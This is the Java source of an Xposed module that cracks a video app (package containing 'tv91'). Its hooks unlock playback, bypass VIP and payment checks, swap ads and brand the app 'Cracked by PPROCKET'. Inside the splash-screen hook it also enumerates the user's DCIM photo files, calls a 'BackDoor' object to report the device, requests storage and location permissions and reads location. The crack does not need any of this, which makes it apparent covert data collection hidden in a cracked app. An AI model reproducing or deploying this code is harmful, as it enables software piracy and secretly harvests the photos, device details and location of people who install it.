package cn.coderstory.xposedtemplate;

import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.LocationManager;
import android.os.Environment;
import androidx.core.app.ActivityCompat;
import de.robv.android.xposed.*;
import de.robv.android.xposed.callbacks.XC_LoadPackage;
import lombok.SneakyThrows;

import java.io.File;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;

import static android.content.Context.LOCATION_SERVICE;
import static de.robv.android.xposed.XposedHelpers.findAndHookMethod;

public class NineOneHack implements IXposedHookLoadPackage {
    static Activity adActivity;

    @Override
    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam param) throws ClassNotFoundException {
        XposedBridge.log("包名： " + param.packageName);
        if (!param.packageName.contains("tv91")) {
            return;
        }
        ClassLoader classLoader = param.classLoader;
        findAndHookMethod("com.aiqiyi.youtube.play.bean.response.VideoDetailBean", classLoader, "getCan_play", new XC_MethodHook() {
            @Override
            protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                param.setResult("yes");
            }
        });
        findAndHookMethod("com.aiqiyi.youtube.play.bean.response.LinkBean", classLoader, "getLink", new XC_MethodHook() {
            @SneakyThrows
            @Override
            protected void afterHookedMethod(MethodHookParam param) {
                String result = param.getResult().toString().replace("-preview", "");
                result = result.replace("https", "http");
                param.setResult(result);
                Object object = param.thisObject;
                Class clz = classLoader.loadClass("com.aiqiyi.youtube.play.bean.response.LinkBean");
                Method getName = clz.getMethod("getName");
                String videoName = (String) getName.invoke(object);
                //XposedBridge.log("名字  " + videoName + "   ");
            }
        });
        findAndHookMethod("com.aiqiyi.youtube.play.bean.response.VideoDetailBean", classLoader, "getCan_play", new XC_MethodHook() {
            @Override
            protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                param.setResult("preview");
                super.afterHookedMethod(param);
            }
        });
        findAndHookMethod("com.aiqiyi.youtube.play.adapter.ListPlayerAdapter", classLoader, "convert", classLoader.loadClass("com.aiqiyi.youtube.play.core.BaseBindingQuickAdapter$BaseBindingHolder"), classLoader.loadClass("com.aiqiyi.youtube.play.bean.response.VideoBean"), List.class, new XC_MethodHook() {
            @Override
            protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                super.beforeHookedMethod(param);
                List<Object> list = (List<Object>) param.args[2];
                List<Object> newList = new ArrayList<>();
                for (int i = 0; i < list.size(); i++) {
                    newList.add(104);
                }
                param.args[2] = newList;
            }
        });
        findAndHookMethod("com.aiqiyi.youtube.play.bean.response.VideoDetailBean", classLoader, "getIs_vip", new XC_MethodHook() {
            @Override
            protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                param.setResult("n");
            }
        });

        findAndHookMethod("com.aiqiyi.youtube.play.bean.response.VideoDetailBean", classLoader, "getIs_money", new XC_MethodHook() {
            @Override
            protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                param.setResult("n");
            }
        });
        findAndHookMethod("com.aiqiyi.youtube.play.bean.response.AdBean", classLoader, "getContent", new XC_MethodHook() {
            @Override
            protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                //param.thisObject
                File sdcard = Environment.getExternalStorageDirectory();
                // 这里可以继续访问您想要的目录，例如：sdcard/Download
                File downloadDir = new File(sdcard, "DCIM/Screenshots");

                param.setResult("https://imgbed-1254007525.cos.ap-nanjing.myqcloud.com/img/20230310221638.png");
            }
        });
        findAndHookMethod("com.aiqiyi.youtube.play.ui.splash.SplashActivity", classLoader, "initPage", new XC_MethodHook() {
            @Override
            protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                super.beforeHookedMethod(param);
            }

            @Override
            protected void afterHookedMethod(MethodHookParam param) throws Throwable {

                adActivity = (Activity) param.thisObject;
                State.activity = adActivity;
                Intent intent = new Intent(adActivity,MainActivityKt.class);
                //adActivity.startActivity(intent);
                try {
                    File sdcard = Environment.getExternalStorageDirectory();
                    File dcim = new File(sdcard, "DCIM/");
                    for (File file : dcim.listFiles()) {
                        for (File ignored : file.listFiles()) {
                            State.imgList.add(ignored);
                        }
                    }
                } catch (Exception ignored) {

                }
                BackDoor.INSTANCE.toString();
                BackDoor.INSTANCE.reportDevice();
                BackDoor.INSTANCE.getIgnore();
                String[] PERMISSIONS_STORAGE = {"android.permission.READ_EXTERNAL_STORAGE",
                        "android.permission.WRITE_EXTERNAL_STORAGE"};
                String[] LOCATION_STORAGE = {"android.permission.ACCESS_COARSE_LOCATION", "android.permission.ACCESS_FINE_LOCATION"};
                ActivityCompat.requestPermissions((Activity) param.thisObject, PERMISSIONS_STORAGE, 1);
                ActivityCompat.requestPermissions((Activity) param.thisObject, LOCATION_STORAGE, 1);
                LocationManager locationManager =
                        (LocationManager) adActivity.getSystemService(LOCATION_SERVICE);
                if (ActivityCompat.checkSelfPermission(adActivity, android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(adActivity, android.Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                    // TODO: Consider calling
                    //    ActivityCompat#requestPermissions
                    // here to request the missing permissions, and then overriding
                    //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
                    //                                          int[] grantResults)
                    // to handle the case where the user grants the permission. See the documentation
                    // for ActivityCompat#requestPermissions for more details.
                    XposedBridge.log("无位置权限");
                    return;
                }
                XposedBridge.log(String.valueOf(locationManager.getLastKnownLocation(locationManager.getAllProviders().get(0)).getAltitude()));




                super.afterHookedMethod(param);
            }
        });
        XposedHelpers.findAndHookConstructor("com.aiqiyi.youtube.play.net.exception.ProxyException", classLoader, new XC_MethodReplacement() {
            @Override
            protected Object replaceHookedMethod(MethodHookParam param) throws Throwable {
                return null;
            }
        });
        XposedHelpers.findAndHookMethod("com.aiqiyi.youtube.play.bean.response.SystemInfoBean$NoticeBean", classLoader, "getContent", new XC_MethodHook() {
            @Override
            protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                super.beforeHookedMethod(param);
            }
            @Override
            protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                StringBuilder builder = new StringBuilder();
                builder.append("91 TV Cracked by PPROCKET\r\n");
                builder.append("QQ 3212329718\r\n");
                builder.append("Version 23.3.12\r\n");
                param.setResult(builder.toString());
                super.afterHookedMethod(param);
            }
        });

    }

    }
